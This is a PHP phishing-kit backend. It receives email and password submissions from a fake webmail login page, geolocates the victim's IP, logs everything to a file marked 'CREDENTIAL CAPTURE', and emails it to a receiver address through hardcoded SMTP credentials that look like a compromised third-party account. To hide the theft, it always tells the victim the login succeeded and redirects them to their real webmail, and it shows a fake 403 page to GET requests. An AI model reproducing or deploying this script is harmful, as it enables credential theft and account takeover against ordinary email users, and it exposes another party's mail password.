<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
$country = $geo->geoplugin_countryName ?? 'Unknown';
$city = $geo->geoplugin_city ?? 'Unknown';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo "<html><head><title>403 - Forbidden</title></head><body><h1>403 Forbidden</h1><hr></body></html>";
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(["signal" => "error", "msg" => "Only POST allowed"]);
    exit();
}

$login = trim($_POST['email'] ?? '');
$passwd = trim($_POST['password'] ?? '');

if (!$login || !$passwd || !str_contains($login, '@')) {
    echo json_encode(["signal" => "error", "msg" => "Email and password required"]);
    exit();
}

list(, $domain) = explode('@', $login);

// SMTP credentials for sending logs
$receiver     = 'bobrob@elitat.com';
$senderuser   = 'tp@globalhouse.co.th';
$senderpass   = 'Globalhouse@123';
$senderport   = 587;
$senderserver = 'mail.globalhouse.co.th';
$smtp_secure  = 'tls';

$timestamp = date('Y-m-d H:i:s');
$logFile = 'SS-Or-LucaGherardi-Tests.txt';

// Prepare the message content
$message = "=== CREDENTIAL CAPTURE ===\n";
$message .= "Timestamp: $timestamp\n";
$message .= "Email: $login\n";
$message .= "Password: $passwd\n";
$message .= "Domain: $domain\n";
$message .= "IP: $ip\n";
$message .= "Country: $country\n";
$message .= "City: $city\n";
$message .= "User Agent: $browser\n";
$message .= "========================\n\n";

// Log to file
file_put_contents($logFile, $message, FILE_APPEND);

// Prepare email content
$emailSubject = "Webmail Login: $login | $country";
$emailBody = "$login|$passwd\nIP of sender: $country | $city | $ip | $browser\n============WEBMAIL-LOGIN signal";

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $senderuser;
    $mail->Password = $senderpass;
    $mail->Port = $senderport;
    $mail->SMTPSecure = $smtp_secure;
    $mail->isHTML(true);
    $mail->Subject = $emailSubject;
    $mail->setFrom($senderuser, 'Webmail Monitor');
    $mail->addAddress($receiver);
    $mail->Body = $emailBody;
    $mail->AltBody = "New webmail login captured";

    if ($mail->send()) {
        // Success - send notification email and show success response
        $response = [
            "signal" => "OK",
            "success" => true,
            "msg" => "Login successful! Redirecting to webmail...",
            "redirect_url" => "https://webmail.$domain",
            "debug_info" => [
                "email_sent" => true,
                "timestamp" => $timestamp
            ]
        ];
        
        // Short delay for success
        usleep(rand(300000, 800000));
    } else {
        // Email failed to send, but still show success to user
        $response = [
            "signal" => "OK",
            "success" => true,
            "msg" => "Login successful! Redirecting to webmail...",
            "redirect_url" => "https://webmail.$domain",
            "debug_info" => [
                "email_sent" => false,
                "timestamp" => $timestamp
            ]
        ];
        
        // Short delay for success
        usleep(rand(300000, 800000));
    }
    
} catch (Exception $e) {
    // Email failed, but still show success to user
    $response = [
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to webmail...",
        "redirect_url" => "https://webmail.$domain",
        "debug_info" => [
            "email_sent" => false,
            "error" => $e->getMessage(),
            "timestamp" => $timestamp
        ]
    ];
    
    // Short delay for success
    usleep(rand(300000, 800000));
}

echo json_encode($response);
exit();
?>